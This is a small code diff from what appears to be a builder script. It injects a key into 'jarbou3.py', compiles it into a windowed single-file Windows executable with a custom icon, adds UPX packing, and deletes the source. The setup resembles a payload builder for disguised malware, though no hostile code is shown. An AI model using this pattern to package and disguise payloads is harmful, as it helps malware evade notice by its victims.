@@ -85,7 +85,7 @@ def build():
             replace_string('jarbou3.py', '$key', key)
 
             print('[+]Compiling')
-            os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3.py"')
+            os.system('pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
             os.remove('jarbou3.py')
             os.system('powershell -c cd dist; cp jarbou3.exe ..')
         elif c == 2:
